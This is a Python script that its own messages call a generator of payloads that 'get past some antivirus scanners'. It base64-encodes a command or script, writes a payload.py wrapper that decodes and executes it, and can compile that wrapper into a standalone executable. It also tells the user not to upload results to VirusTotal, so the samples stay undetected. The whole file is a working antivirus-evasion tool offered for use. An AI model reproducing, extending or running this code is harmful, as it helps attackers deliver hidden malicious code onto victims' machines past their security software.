#!/bin/python3.9
import subprocess
import shlex
import base64

print("\nEnter shellcodes or other commands")
print("\nto generate a payload that should")
print("\nget past some antivirus scanners.")
print("\nDo not upload to Virus Total.")

choice = input("\nEncode a shellcode or script? ")

if choice == "shellcode":
    payload = input("\nEnter command: ")
    payload_bytes = payload.encode('utf-8')
    payload_encoded = base64.b64encode(payload_bytes)
    text = f'''
#!/bin/python3.9
from subprocess import Popen, PIPE
import shlex
import base64

payload = {payload_encoded}

execute = base64.b64decode(payload)
payload_decoded = execute.decode('utf-8')
def execute(command):
    try:
        p = Popen(shlex.split(command), stdin=PIPE, stdout=PIPE, stderr=PIPE)
        p.wait()
    except:
        return Exception        
execute(payload_decoded)
'''

elif choice == "script":
    path = input("Enter the path to the script: ")
    thefile = open(path, "rb")
    data = thefile.read()
    payload_encoded = base64.b64encode(data)
    text = f'''
#!/bin/python3.9
import base64
from cryptography.fernet import Fernet
payload = {payload_encoded}
payload_decoded = base64.b64decode(payload)
exec(payload_decoded)
'''

with open("payload.py", "w") as thepayload:
    thepayload.write(text)
    print("Payload Generated!!")

cont = input("Would you like to compile an executable? (y/n) ")
if cont == "y":
    cmd = "pyinstaller --onefile payload.py"
    subprocess.call(shlex.split(cmd))
elif cont == "n":
    print("Closing down... ")
exit()
